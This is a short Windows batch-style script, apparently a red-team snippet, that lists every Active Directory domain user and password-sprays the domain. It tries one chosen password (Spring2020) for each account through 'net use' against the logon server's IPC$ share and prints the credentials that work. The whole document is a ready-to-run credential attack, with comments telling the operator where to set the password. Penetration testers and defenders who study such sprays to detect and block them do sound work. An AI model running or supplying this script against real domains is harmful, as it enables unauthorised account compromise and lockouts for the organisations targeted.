rem Create the users.txt by parsing the "net users /domain" output
del %temp%\1.txt >nul 2>&1 & del %temp%\2.txt >nul 2>&1 & del %temp%\3.txt >nul 2>&1 & del %temp%\users.txt >nul 2>&1
@FOR /F "skip=6 delims=" %a in ('net users /domain ^| findstr /vc:"The command c"') do @set line=%a & @call echo %^line:  =,%  >> %temp%\1.txt
@FOR /F "delims=" %a in (%temp%\1.txt) do @set line=%a & @call echo %^line:, =,% >> %temp%\2.txt
@FOR /F "tokens=1-3 delims=," %n in (%temp%\2.txt) do @echo %n >> %temp%\3.txt & @echo %o >> %temp%\3.txt & @echo %p >> %temp%\3.txt
@FOR /F "tokens=*" %a in ('type %temp%\3.txt ^| findstr /vc:"ECHO is on."') do @echo %a >> %temp%\users.txt
rem Reset the command window title so you can see the progress of the password spray in the title
title Command Prompt
rem Set your password for the spray here
set password=Spring2020
rem Execute the password spray, trying the password set above for every user in the domain
@FOR /F %n in (%temp%\users.txt) do @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "%password%" 1>NUL 2>&1 && @echo [*] %n:%password% && @net use /delete %logonserver%\IPC$ > NUL
